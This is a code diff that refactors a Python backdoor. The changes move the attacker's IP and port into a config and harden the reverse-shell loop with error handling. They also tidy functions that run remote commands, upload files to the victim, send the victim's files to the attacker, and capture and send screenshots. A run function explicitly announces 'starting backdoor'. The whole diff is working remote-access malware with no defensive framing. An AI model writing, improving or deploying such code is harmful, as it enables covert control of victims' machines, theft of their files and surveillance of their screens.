@@ -4,10 +4,8 @@ import os
 from time import sleep
 from pyautogui import screenshot
 
-def reverse_shell():
+def reverse_shell(attacker_ip, attacker_port):
 
-    attacker_ip = "192.168.1.26"
-    attacker_port = 4444
 
     while True:
         try:
@@ -38,22 +36,23 @@ def reverse_shell():
                     if output:
                         s.send((output + '\n').encode())
 
-        except Exception as e:
-            print("ERROR: Retrying in 10 sec")
+        except (socket.error, BrokenPipeError) as e:
+            print(f"[ERROR] Connection lost: {e}. Retrying in 10 seconds.")
+            s.close()
             sleep(10)
 
 
 def upload_file(conn, filename):
     try:
-        with open(filename, "wb") as file:
-            while True:
-                data = conn.recv(1024)
-                print(f"[DEBUG] Received: {data}")
-                if data.strip() == b'END':
-                    print("[DEBUG] Received END")
-                    break
-                file.write(data)
-
+        file = open(filename, "wb")
+        while True:
+            data = conn.recv(1024)
+            if data.strip() == b'END':
+                print("[DEBUG] Upload finished.")
+                break
+            file.write(data)
+        file.close()
+        
         conn.send(b"Upload complete\n")
 
     except Exception as e:
@@ -62,20 +61,47 @@ def upload_file(conn, filename):
 
 
 
+
 def download_file(conn, filepath):
     normalized_path = os.path.normpath(filepath)
 
-    if os.path.exists(normalized_path):
-        with open(normalized_path, "rb") as file:
+    try:
+        if os.path.exists(normalized_path):
+            file = open(normalized_path, "rb")
             conn.sendall(file.read())
-    else:
-        conn.send(b"File not found")
+            file.close()
+        else:
+            conn.send(b"File not found")
+    except Exception as e:
+        conn.send(f"Download failed: {e}\n".encode())
+        print(f"[ERROR] Download failed: {e}")
+
 
 
 def take_screenshot(conn, filename):
-    image = screenshot(filename)
-    with open(filename, 'rb') as file:
+    try:
+        screenshot(filename)
+        file = open(filename, 'rb')
         conn.sendall(file.read())
+        file.close()
+        os.remove(filename)
+        conn.send(b"Screenshot captured and sent\n")
+    except Exception as e:
+        conn.send(f"Screenshot failed: {e}\n".encode())
+        print(f"[ERROR] Screenshot failed: {e}")
+
+
+def run(config):
+    attacker_ip = config.get("attacker_ip")
+    attacker_port = config.get("attacker_port")
+
+    if not attacker_ip or not attacker_port:
+        print("[ERROR] missing necessary params")
+        return {"status": "error", "message": "Missing config for attacker_ip or attacker_port"}
+
+    print(f"[INFO] starting backdoor to {attacker_ip}:{attacker_port}...")
+    reverse_shell(attacker_ip, attacker_port)
+    return {"status": "success", "message": "Backdoor executed"}
 
 
 if __name__ == "__main__":
